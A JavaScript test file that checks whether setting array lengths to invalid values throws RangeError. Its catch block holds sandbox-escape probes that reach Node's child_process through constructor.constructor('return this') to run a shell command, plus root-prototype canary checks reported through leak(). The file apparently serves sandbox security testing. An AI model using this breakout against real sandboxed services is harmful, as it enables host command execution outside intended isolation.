try {
    try {
        var x = [];
        x.length = NaN;
        $ERROR('#1.1: x = []; x.length = NaN throw RangeError. Actual: x.length === ' + x.length);
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#1.2: x = []; x.length = NaN throw RangeError. Actual: ' + e);
        }
    }
    try {
        x = [];
        x.length = Number.POSITIVE_INFINITY;
        $ERROR('#2.1: x = []; x.length = Number.POSITIVE_INFINITY throw RangeError. Actual: x.length === ' + x.length);
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#2.2: x = []; x.length = Number.POSITIVE_INFINITY throw RangeError. Actual: ' + e);
        }
    }
    try {
        x = [];
        x.length = Number.NEGATIVE_INFINITY;
        $ERROR('#3.1: x = []; x.length = Number.NEGATIVE_INFINITY throw RangeError. Actual: x.length === ' + x.length);
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#3.2: x = []; x.length = Number.NEGATIVE_INFINITY throw RangeError. Actual: ' + e);
        }
    }
    try {
        x = [];
        x.length = undefined;
        $ERROR('#4.1: x = []; x.length = undefined throw RangeError. Actual: x.length === ' + x.length);
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#4.2: x = []; x.length = undefined throw RangeError. Actual: ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}